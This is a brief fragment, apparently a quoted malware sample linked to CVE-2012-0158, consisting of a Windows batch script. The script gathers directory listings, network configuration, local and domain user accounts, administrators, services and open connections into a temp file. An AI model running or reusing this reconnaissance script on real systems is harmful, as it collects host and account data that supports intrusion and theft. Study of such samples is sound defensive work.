- CVE-2012-0158
- 



```
@echo off 

dir c:\ >> %temp%\download 

ipconfig /all >> %temp%\download 

net user >> %temp%\download 

net user /domain >> %temp%\download 

ver >> %temp%\download 



@echo off 

dir "c:\Documents and Settings" >> %temp%\download 

dir "c:\Program Files\" >> %temp%\download 

net start >> %temp%\download 

net localgroup administrator >> %temp%\download 

netstat -ano >> %temp%\download
```

